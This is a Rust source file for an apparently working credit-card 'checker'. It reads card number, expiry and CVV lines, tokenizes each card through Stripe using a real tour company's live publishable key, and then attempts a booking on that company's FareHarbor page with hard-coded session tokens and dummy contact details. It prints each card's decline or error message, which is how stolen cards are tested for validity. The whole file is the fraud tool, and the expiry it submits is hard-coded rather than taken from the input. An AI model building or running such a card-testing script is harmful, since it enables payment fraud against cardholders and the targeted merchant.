use std::fs::File;
use std::io::{self, Write};
// use reqwest::header::{HeaderValue};
use reqwest::{Client,Method};
use url::Url;
use cookie::{CookieJar};
use scraper::{Html, Selector};
use serde_json::{json, Value};
use reqwest::header::{HeaderMap, HeaderValue, ACCEPT, ACCEPT_ENCODING, ACCEPT_LANGUAGE, CONTENT_LENGTH, CONTENT_TYPE, COOKIE, ORIGIN, REFERER, USER_AGENT, HeaderName};
use std::thread::sleep;
use std::time::Duration;

fn find_between(text: &str, start: &str, end: &str) -> Option<String> {
    let start_index = text.find(start)?;
    let start_index = start_index + start.len();
    let end_index = text.find(end)?;

    if start_index > end_index {
        return None;
    }

    let result = &text[start_index..end_index];
    Some(result.to_string())
}

#[tokio::main]
pub async fn checker(lista: &str) -> Result<(), Box<dyn std::error::Error>> {
    let split_values: Vec<&str> = lista.split('|').collect();

let cc = split_values.get(0).unwrap_or(&"").to_string();
let mes = split_values.get(1).unwrap_or(&"").to_string();
let ano = split_values.get(2).unwrap_or(&"").to_string();
let cvv = split_values.get(3).unwrap_or(&"").to_string();


    let cookie_jar = reqwest::cookie::Jar::default();

    let client = Client::builder()
        .user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
        .cookie_store(true)
        .build()?;
    let mut jar = CookieJar::new();
    let mut headers = HeaderMap::new();


    /////1st request
    let response = client.get("https://www.bluecoastcullen.co.uk/sup-lessons-tours").send()
    .await?;
// println!("{}",response.text().await?);
headers.insert(ACCEPT, HeaderValue::from_static("application/json"));
    headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US"));
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
    headers.insert(ORIGIN, HeaderValue::from_static("https://js.stripe.com"));
    headers.insert(REFERER, HeaderValue::from_static("https://js.stripe.com/"));

    // Build the POST data
    let post_data = format!(
        "time_on_page=105809&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_5FCeUYuVtc0RN4Pa3C17g82R&payment_user_agent=stripe.js%2F78ef418&card[number]={}&card[exp_month]=6&card[exp_year]=2025&card[cvc]={}&card[name]=asd+asd&card[address_zip]=10080&card[address_country]=US",
        cc, cvv
    );

    let url = Url::parse("https://api.stripe.com/v1/tokens")?;

    let mut res = client
        .request(Method::POST, url)
        .headers(headers)
        .body(post_data.to_string())
        .send().await?;

    let mut response_body = String::new();
    let response_body = res.text().await?;

    // println!("Response: {}", response_body);

    let start_marker = r#"id": ""#;
                let end_marker = r#"""#;
                let authenticity_token = extract_substring(&response_body, start_marker, end_marker);

                if let Some(token) = authenticity_token {
                    // Do something with the authenticity_token value
                    // println!("Authenticity Token: {}", token);
                    let url = Url::parse("https://fareharbor.com/api/v1/companies/bluecoastsurf-paddle/items/390560/availabilities/1016651945/book/")?;

    let mut second_headers = HeaderMap::new();
    second_headers.insert(ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
    // second_headers.insert(ACCEPT_ENCODING, HeaderValue::from_static("gzip, deflate, br"));
    second_headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
    second_headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json;charset=UTF-8"));
    second_headers.insert(ORIGIN, HeaderValue::from_static("https://fareharbor.com"));
    second_headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"));
    second_headers.insert(
        HeaderName::from_bytes(b"X-Csrftoken").unwrap(),
        HeaderValue::from_bytes(b"sPbGw2n2JMbkGfL0t9aVCXRAAD9bqMKD7nfGGsaSIxJ9sLbRfw02pFpQFDjnkb9p").unwrap(),
    );
    second_headers.insert(
        HeaderName::from_bytes(b"X-Fh-Target-Language").unwrap(),
        HeaderValue::from_bytes(b"en-us").unwrap(),
    );
    second_headers.insert(
        HeaderName::from_bytes(b"X-Fh-User-Identifier").unwrap(),
        HeaderValue::from_bytes(b"8efe3ccf-8eae-4e42-882c-d2567e004f11").unwrap(),
    );
    second_headers.insert(
        HeaderName::from_bytes(b"X-Queuing-Token-390560").unwrap(),
        HeaderValue::from_bytes(b"110fcdba9dcb4dd9bc905bde4879db23").unwrap(),
    );
    second_headers.insert(
        HeaderName::from_bytes(b"X-Requested-With").unwrap(),
        HeaderValue::from_bytes(b"XMLHttpRequest").unwrap(),
    );


    let post_data = format!(r#"
        {{
            "explicit_gross": "",
            "contact-is_subscribed": false,
            "contact-language": null,
            "terms-is_accepted": false,
            "send_notification": false,
            "is_sms_enabled": false,
            "is_demo": false,
            "online_booking_reference": "",
            "client_uuid": "62301d60-98fe-4b95-b2a4-dc5ca7f0b9f8",
            "is_deposit": false,
            "affiliation-affiliation": null,
            "affiliation-affiliate_company_shortname": "",
            "affiliation-voucher-voucher_number": "",
            "affiliation-voucher-agent": null,
            "affiliation-voucher-agent_name": "",
            "affiliation-voucher-desk": null,
            "affiliation-voucher-desk_name": "",
            "payments-payment-country_code": "US",
            "payments-payment-kind": "full",
            "payments-payment-is_collected_by_affiliate": false,
            "payments-payment-is_demo": false,
            "payments-payment-gross": 8000,
            "payments-payment-deposit": 0,
            "payments-payment-booking_fee": 480,
            "payments-payment-option": "charge",
            "payments-payment-is_authorization_hold_initiated": false,
            "payments-is_redeeming": false,
            "payments-redeem-stored_value_card_numbers": "",
            "payments-redeem-redeem_amounts": "",
            "payments-payment-note": "",
            "payments-payment-file_payment": "",
            "payments-payment-card_on_file": "",
            "payments-payment-in_store_payment_type": "",
            "total_sheet": 390208,
            "invoice_sheet": null,
            "total_schedule_entry_rules": [],
            "invoice_schedule_entry_rules": [],
            "customer_type_rate:4167220770-count": 1,
            "custom_field_instance_6188048_for:booking-value": null,
            "notification-type": "booking-confirmation",
            "notification-note": "",
            "notification-emails": "asd@gmail.com",
            "member_verification_email": "asd@gmail.com",
            "custom_field_instance_6821505_for:4167220770-0-value": true,
            "contact-phone_country": "VI",
            "contact-name": "asd",
            "contact-phone": "3409329930",
            "contact-email": "asd@gmail.com",
            "payments-payment-card_number": "••••••••••••••••",
            "payments-payment-card_expiry_month": "••••••••",
            "payments-payment-card_expiry_year": "••••••••",
            "payments-payment-cardholders_name": "asd asd",
            "payments-payment-card_cvc": "••••••••",
            "payments-payment-postal_code": "10080",
            "type": "completed",
            "is_showing_hidden_custom_fields": false,
            "payments-payment-processor_type": "stripe",
            "payments-payment-card_last_4": "7167",
            "payments-payment-card_type": "visa",
            "payments-payment-tokenization_type": "stripe-js",
            "payments-payment-stripe_token": "{}",
            "payments-payment-stripe_payment_intent_id": null,
            "payments-payment-stripe_payment_method_id": null,
            "payments-payment-stripe_is_retrying_payment": false,
            "selected_resource_requirements": []
        }}
    "#,token);

    // let client = Client::new();
    let response = client
    .post(url)
    .headers(second_headers)
    .body(post_data)
    .send()
    .await?;

    let response_body = response.text().await?;
    // Parse the JSON response
    let json: Value = serde_json::from_str(&response_body)?;

    // Extract the error message
    let error_message = json["book_form"]["all"][0].as_str().unwrap_or("Unknown Error");
    println!("cc: {}", cc);
    println!("mes: {}", mes);
    println!("ano: {}", ano);
    println!("cvv: {}", cvv);
    println!("{}",error_message);
    println!("--------------------------------------------------")
                }else{
                    println!("Not Found!");
                }

Ok(())


}

fn extract_substring<'a>(input: &'a str, start_marker: &'a str, end_marker: &'a str) -> Option<&'a str> {
    let start_index = input.find(start_marker)?;
    let start_index = start_index + start_marker.len();
    let end_index = input[start_index..].find(end_marker)?;

    if start_index > end_index {
        return None;
    }

    let result = &input[start_index..start_index + end_index];
    Some(result)
}